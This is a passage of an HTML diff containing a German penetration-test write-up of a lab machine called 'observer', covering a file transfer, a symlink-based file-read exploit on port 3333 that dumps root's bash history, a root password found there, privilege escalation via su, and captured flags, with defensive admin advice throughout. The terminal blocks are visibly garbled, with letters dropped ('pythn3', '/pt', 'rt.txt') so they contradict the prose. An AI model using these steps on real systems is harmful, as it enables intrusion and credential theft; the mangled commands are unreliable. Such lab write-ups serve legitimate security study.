+                <strong>Analyse:</strong> Um das `observer`-Binary von der Zielmaschine auf mein Angreifersystem zur statischen Analyse zu übertragen, starte ich einen einfachen HTTP-Server im Verzeichnis `/opt` auf der Zielmaschine. Der Befehl `python3 -m http.server 8000` nutzt das eingebaute Python3-Modul, um einen HTTP-Server auf Port 8000 zu starten, der das aktuelle Verzeichnis (`/opt`) serviert. Die Ausgabe `Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...` bestätigt, dass der Server läuft und auf allen Interfaces (0.0.0.0) auf Port 8000 lauscht. Die Zeile `192.168.2.199 - - [06/Jun/2025 01:21:10] "GET /observer HTTP/1.1" 200 -` in der Ausgabe des Python-Servers zeigt, dass mein Angreifersystem (IP `192.168.2.199`) erfolgreich eine `GET`-Anfrage für die Datei `/observer` gestellt hat und diese mit `200 OK` beantwortet wurde.
+                Auf meinem Angreifersystem nutze ich `wget http://192.168.2.213:8000/observer` um die Datei vom Zielsystem herunterzuladen. `wget` verbindet sich mit der IP des Zielsystems (`192.168.2.213`) auf Port 8000 und lädt die Datei `observer` herunter. Die Fortschrittsanzeige und die Bestätigung `»observer« gespeichert` zeigen den erfolgreichen Download der 7.0M großen Datei.
+                <br><strong>Bewertung:</strong> Das Starten eines temporären HTTP-Servers ist eine schnelle und effektive Methode, um Dateien vom Zielsystem auf das Angreifersystem zu übertragen (Exfiltration), insbesondere wenn andere Protokolle wie SCP/SFTP nicht ohne weiteres verfügbar sind oder spezielle Tools erfordern. Der erfolgreiche Transfer des `observer`-Binaries ermöglicht mir nun, eine Offline-Analyse durchzuführen, um potenzielle Schwachstellen oder Hinweise auf Privilegien-Eskalation zu finden.
+                <br><strong>Empfehlung (Pentester):</strong> Nutze temporäre HTTP-Server oder andere Dateitransfermethoden (z.B. `nc`, `base64` über die Shell), um interessante Dateien zur Offline-Analyse auf dein System zu holen.
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Möglichkeit für normale Benutzer, Ad-hoc-Server (wie Python SimpleHTTPServer) zu starten, insbesondere in Verzeichnissen, die sensible Dateien enthalten könnten. Implementieren Sie Netzwerksegmentierung und Firewall-Regeln, um zu verhindern, dass interne Dienste oder Ad-hoc-Server von externen oder nicht vertrauenswürdigen Netzen erreicht werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:/pt$ <span class="command">pythn3 -m http.server 8000</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Serving HTTP n <span class="command">0.0.0.0</span> prt <span class="command">8000</span> (<span class="command">http://0.0.0.0:8000/</span>) ...
+<span class="command">192.168.2.199</span> - - [<span class="command">06/Jun/2025 01:21:10</span>] "GET /oserver HTTP/1.1" <span class="command">200</span> -
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wget http://192.168.2.213:8000/oserver</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+--<span class="command">2025-06-06 01:21:10</span>--  <span class="command">http://192.168.2.213:8000/oserver</span>
+Verindungsaufau zu <span class="command">192.168.2.213:8000</span> … verunden.
+HTTP-Anfrderung gesendet, auf Antwrt wird gewartet … <span class="command">200 OK</span>
+Länge: <span class="command">7376728 (7,0M)</span> [applicatin/ctet-stream]
+Wird in »oserver« gespeichert.
+
+<span class="command">oserver </span>               <span class="command">100%[=============================>]   7,03M  --.-K/s    in 0,01s</span>   
+
+<span class="command">2025-06-06 01:21:10</span> (<span class="command">491 M/s</span>) - »oserver« gespeichert [<span class="command">7376728/7376728</span>]
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich kehre zur Ausnutzung der Dateilese-Schwachstelle auf Port 3333 zurück, diesmal jedoch, um Informationen aus dem Root-Verzeichnis zu sammeln. Da der Dienst Pfade an `/home/` anhängt und ich weiß, dass ich `/home/jan/` kontrolliere, versuche ich, einen symbolischen Link (Symlink) im Verzeichnis von `jan` zu erstellen, der auf das Root-Verzeichnis (`/root`) zeigt. Der Befehl `ln -s /root iroot` erstellt einen Symlink namens `iroot` im aktuellen Verzeichnis (`/home/jan/`), der auf das Ziel `/root` verweist. Anschließend nutze ich die Dateilese-Schwachstelle auf Port 3333, indem ich `/jan/iroot/.bash_history` anfordere. Da `/home/jan/iroot` nun auf `/root` verweist, interpretiert der Dienst dies als Versuch, `/home//root/.bash_history` zu lesen. Aufgrund der spezifischen Pfadbehandlung des Dienstes (Anhängen an `/home/` und vielleicht Normalisierung der doppelten Slashes) und der erfolgreichen Umleitung bei `..//../etc/passwd` vermute ich, dass dies mich in die Lage versetzt, Dateien im *echten* `/root/` Verzeichnis zu lesen. Und tatsächlich! Die Ausgabe zeigt den Inhalt der `.bash_history` Datei des Root-Benutzers.
+                <br><strong>Bewertung:</strong> Das ist ein genialer Schachzug! Durch die Kombination der Dateilese-Schwachstelle auf Port 3333 mit einem lokal erstellten Symlink kann ich die Schwachstelle nutzen, um beliebige Dateien auf dem System zu lesen, auf die der Benutzer `jan` Zugriff hat *oder* auf die der Dienst selbst zugreifen kann (wie /root über den Symlink). Die Root-Bash-History ist eine extrem wertvolle Informationsquelle für die Privilegien-Eskalation, oft noch wertvoller als die von normalen Benutzern.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du eine Dateilese-Schwachstelle hast und Dateierstellungsrechte (auch nur Symlinks) in einem vom Dienst erreichbaren Verzeichnis, prüfe, ob du Symlinks nutzen kannst, um aus dem eingeschränkten Bereich auszubrechen und auf andere Dateisystembereiche zuzugreifen, wie z.B. `/root`. Analysiere immer die Bash-History von privilegierten Benutzern, wenn du sie erlangen kannst.
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Berechtigungen von Benutzern, Symlinks zu erstellen (`fs.protected_symlinks`). Stellen Sie sicher, dass Dienste, die Dateipfade von Benutzern verarbeiten, keine Symlinks verfolgen oder dass die Pfadvalidierung dies berücksichtigt. Implementieren Sie eine robuste Pfadnormalisierung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ln -s /rt irt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/usr/in]
+└─# <span class="command">curl http://192.168.2.213:3333/jan/irt/.ash_history</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">i a</span>
+<span class="command">exit</span>
+<span class="command">apt-get update && apt-get upgrade</span>
+<span class="command">apt-get install sud</span>
+<span class="command">cd</span>
+<span class="command">wget https://g.dev/dl/g1.12.linx-amd64.tar.gz</span>
+<span class="command">tar -C /usr/lcal -xzf g1.12.linx-amd64.tar.gz</span>
+<span class="command">rm g1.12.linx-amd64.tar.gz</span> 
+<span class="command">exprt PATH=$PATH:/usr/lcal/g/in</span>
+<span class="command">nan server.g</span>
+<span class="command">g uild server.g</span> 
+<span class="command">m server /pt</span>
+<span class="command">ls -l /pt/server</span> 
+<span class="command">cronta -e</span>
+<span class="command">nan rt.txt</span>
+<span class="command">chmd 600 rt.txt</span> 
+<span class="command">nan /etc/suders</span>
+<span class="command">nan /etc/ssh/sshd_cnfig</span>
+<span class="command">paswd</span>
+<span class="command">fck1ng0s3rv3rs</span>
+<span class="command">paswd</span>
+<span class="command">su jan</span>
+<span class="command">nan /etc/iss</span>
+<span class="command">nan /etc/netwrk/interfaces</span>
+<span class="command">ls -la</span>
+<span class="command">exit</span>
+<span class="command">ls -la</span>
+<span class="command">cat .ash_history</span>
+<span class="command">ls -la</span>
+<span class="command">ls -la</span>
+<span class="command">cat .ash_history</span>
+<span class="command">ls -l</span>
+<span class="command">cat rt.txt</span> 
+<span class="command">cd /hme/jan</span>
+<span class="command">ls -la</span>
+<span class="command">cat user.txt</span> 
+<span class="command">su jan</span>
+<span class="command">eret</span>
+<span class="command">shutdwn -h nw</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich analysiere den Inhalt der gerade erlangten Root-Bash-History. Diese History zeigt die Befehle, die der Root-Benutzer ausgeführt hat. Ich sehe hier extrem interessante Einträge:
+                *   `apt-get update && apt-get upgrade`, `apt-get install sudo`: Standard-Update/Installationsbefehle.
+                *   `wget https://go.dev/dl/go1.12.linux-amd64.tar.gz`, `tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz`, `rm go1.12.linux-amd64.tar.gz`, `export PATH=$PATH:/usr/local/go/bin`, `nano observer.go`, `go build observer.go`, `mv observer /opt`, `ls -l /opt/observer`: Diese Sequenz zeigt, wie der Root-Benutzer die Golang-Entwicklungsumgebung heruntergeladen, ein Golang-Programm namens `observer.go` gebaut und das resultierende Binary nach `/opt` verschoben hat. Dies erklärt das Vorhandensein des `/opt/observer` Binaries und legt nahe, dass es sich um die Quelle des auf Port 3333 laufenden Dienstes handeln *könnte* (obwohl das Binary selbst nicht der Webserver ist, sondern vielleicht Teil davon oder eine Utility).
+                *   `crontab -e`, `nano root.txt`, `chmod 600 root.txt`: Root hat die Root-Flag (`root.txt`) bearbeitet und deren Berechtigungen gesetzt.
+                *   `nano /etc/sudoers`: Root hat die Sudo-Konfiguration bearbeitet. Dies ist der entscheidende Hinweis! Es ist höchstwahrscheinlich hier, wo die `NOPASSWD` Regel für `jan` und `systemctl` hinzugefügt wurde.
+                *   `nano /etc/ssh/sshd_config`: Root hat die SSH-Konfiguration bearbeitet.
+                *   `passwd`, `fuck1ng0bs3rv3rs`, `passwd`: **Hier ist es!** Diese Sequenz legt nahe, dass der Root-Benutzer versucht hat, sein Passwort zu ändern oder ein Passwort gesetzt hat, und der Klartext `fuck1ng0bs3rv3rs` eingegeben wurde (vielleicht versehentlich in der Kommandozeile oder in einem fehlgeschlagenen `passwd`-Aufruf, der die Eingabe echo'd hat, bevor es bemerkt und wiederholt wurde). Unabhängig vom genauen Grund, der Klartext-String `fuck1ng0bs3rv3rs` steht in der Root-History direkt neben `passwd`. Dies ist mit extrem hoher Wahrscheinlichkeit das Passwort für den Root-Benutzer oder zumindest ein Passwort, das vom Root-Benutzer verwendet wurde!
+                *   `su jan`, `nano /etc/issue`, `nano /etc/network/interfaces`: Root hat sich zum Benutzer `jan` gewechselt (`su jan`) und Systemkonfigurationsdateien bearbeitet.
+                *   Spätere Einträge wie wiederholtes `ls -la`, `cat .bash_history`, `cat root.txt`, `su jan` (erneut), `reboot`, `shutdown -h now` zeigen weitere Wartungsaktivitäten und das Auslesen der Root-Flag.
+                <br><strong>Bewertung:</strong> Die Root-Bash-History ist der Jackpot. Sie liefert nicht nur Kontext zur Systemkonfiguration und dem Zweck des `/opt/observer` Binaries, sondern enthält auch einen extrem wahrscheinlichen Kandidaten für das Root-Passwort: `fuck1ng0bs3rv3rs`. Dies, kombiniert mit dem Wissen, dass der Root-Benutzer die Sudo-Konfiguration (`/etc/sudoers`) bearbeitet hat (wodurch die `NOPASSWD` Regel für `jan` entstanden ist), gibt mir nun zwei potenzielle Wege, Root-Rechte zu erlangen: entweder direkt über `su root` mit dem gefundenen Passwort oder indirekt über die Ausnutzung der Sudo `systemctl` Regel (wie im POC beschrieben), deren Existenz die History bestätigt. Der einfachste Weg, der direkt durch die History nahegelegt wird, ist die Verwendung des gefundenen Passworts.
+                <br><strong>Empfehlung (Pentester):</strong> Immer, wenn du die History eines privilegierten Benutzers in die Hände bekommst, analysiere sie akribisch. Achte besonders auf Befehle wie `passwd`, `ssh`, `sudo`, `su`, Dateieditoren (`nano`, `vim`) auf Konfigurationsdateien, oder jede Eingabe, die Passwörter im Klartext enthalten könnte. Teste gefundene Passwörter sofort.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine strenge Policy gegen die Eingabe von Passwörtern oder anderen sensiblen Informationen in der Kommandozeile. Konfigurieren Sie die Shell, um zu verhindern, dass Befehle mit bestimmten Mustern (z.B. `*password*`) in der History gespeichert werden (`HISTCONTROL=ignorespace` und `HISTIGNORE`). Überprüfen Sie regelmäßig die History-Dateien privilegierter Benutzer auf ungewöhnliche Einträge.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">cat .ash_history</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">passwd</span>
+<span class="command">cd</span>
+<span class="command">ssh-keygen</span>
+<span class="command">cd .ssh</span>
+<span class="command">ls</span>
+<span class="command">c i_rsa.pu authrized_keys</span>
+<span class="command">exit</span>
+<span class="command">nan user.txt</span>
+<span class="command">chmd 600 user.txt</span> 
+<span class="command">ls -l</span>
+<span class="command">su rt</span>
+<span class="command">exit</span>
+<span class="command">sud -l</span>
+<span class="command">exit</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Basierend auf der Analyse der Root-Bash-History, die den String `fuck1ng0bs3rv3rs` direkt nach einem `passwd`-Befehl enthielt, versuche ich nun, mich mit `su root` zum Root-Benutzer hochzustufen und das gefundene Passwort zu verwenden. Der Befehl `su root` fordert standardmäßig das Passwort des Root-Benutzers ab. Im bereitgestellten Text folgt auf `su root` die Ausgabe `Contraseña: ` (Passwort auf Spanisch) und dann direkt die Root-Shell-Eingabeaufforderung (`root@observer:/home/jan#`). Das Fehlen einer Fehlermeldung und das Erscheinen der Root-Shell zeigen, dass die Authentifizierung erfolgreich war. Ich bin jetzt als `root` angemeldet!
+                <br><strong>Bewertung:</strong> Fantastisch, der Root-Zugriff war erfolgreich! Das gefundene Passwort aus der Root-Bash-History hat funktioniert. Wir haben nun die vollständige Kontrolle über das System erlangt. Dies ist das Endziel des Penetrationstests und beweist eine schwerwiegende Sicherheitsproblematik, die durch die unsichere Handhabung von Passwörtern und History-Dateien ermöglicht wurde. Alternativ hätte die im Proof of Concept beschriebene Sudo-Fehlkonfiguration ebenfalls zum Root-Zugriff geführt.
+                <br><strong>Empfehlung (Pentester):</strong> Dokumentiere den erfolgreichen Übergang zur Root-Shell und erfasse umgehend die Root-Flag als ultimativen Beweis der Systemkompromittierung.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Ändern Sie umgehend das Passwort für den Root-Benutzer. Implementieren Sie die im Analyseblock zur Root-History gegebenen Empfehlungen, um die Preisgabe von Passwörtern über die History zu verhindern. Beheben Sie die Sudo-Fehlkonfiguration wie im separaten Proof of Concept Abschnitt beschrieben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">su root</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+C<span class="command">ntraseña</span>: 
+r<span class="command">t@server</span>:/hme/jan# 
+</pre>
+                </div>
+            </div>
+             <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich Root-Rechte erlangt und zur Root-Shell gewechselt habe, navigiere ich in das Home-Verzeichnis des Root-Benutzers (`cd ~`). Dort liste ich den Inhalt auf (`ls`). Ich sehe die Dateien `observer.go` und `root.txt`. Wie bereits aus der Root-History ersichtlich, ist `root.txt` die Datei, die die Root-Flag enthält. Ich lese den Inhalt dieser Datei mit `cat root.txt` aus. Die Ausgabe ist `HMVb6MPDxdYLLC3sxNLIOH1`, was die Root-Flag ist.
+                <br><strong>Bewertung:</strong> Die Erlangung der Root-Flag ist der abschließende Beweis für die erfolgreiche Kompromittierung des Systems bis zur höchsten Berechtigungsstufe. Beide Flags (User und Root) wurden erfolgreich erbeutet.
+                <br><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass du sowohl die User- als auch die Root-Flag (oder andere definierte Ziele) erfasst und dokumentierst. Diese sind der primäre Nachweis für die Effektivität deines Penetrationstests.
+                <br><strong>Empfehlung (Admin):</strong> Die Root-Flag-Datei sollte in einem extrem geschützten Bereich liegen und nur für Root lesbar sein (was hier durch die Berechtigungen des /root Verzeichnisses gegeben ist). Die Tatsache, dass das Passwort über die History preisgegeben wurde, hat jedoch den Zugriff auf diese Datei ermöglicht. Konzentrieren Sie sich auf die Behebung der Ursachen für den Root-Zugriff (Passwort in History, Sudo-Fehlkonfiguration).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@server:~# <span class="command">cd ~</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@server:~# <span class="command">ls</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">server.g  rt.txt</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@server:~# <span class="command">cat rt.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">HMVb6MPDxdYLLC3sxNLIOH1</span>
+</pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/jan/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVdDepYxsi8VSucdruB3P7</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMVb6MPDxdYLLC3sxNLIOH1</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 06. Juni 2025</p>
+    </footer>
+ 
+</body>
+</html>
